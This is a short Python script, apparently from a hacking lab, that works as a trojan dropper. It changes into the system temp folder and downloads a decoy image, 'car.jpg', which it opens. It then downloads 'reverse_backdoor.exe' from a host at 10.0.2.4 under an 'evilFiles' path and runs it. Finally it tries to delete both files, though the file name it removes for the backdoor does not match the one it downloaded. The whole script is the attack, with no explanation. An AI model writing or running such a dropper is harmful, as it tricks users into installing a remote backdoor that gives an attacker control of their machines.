#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()  # Get OS temp directory path
os.chdir(temp_directory)  # Change current directory to temp

download("http://10.0.2.4/evilFiles/car.jpg")
subprocess.Popen("car.jpg", shell=True)

download("http://10.0.2.4/evilFiles/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("car.jpg")
os.remove("reverseBackdoor.exe")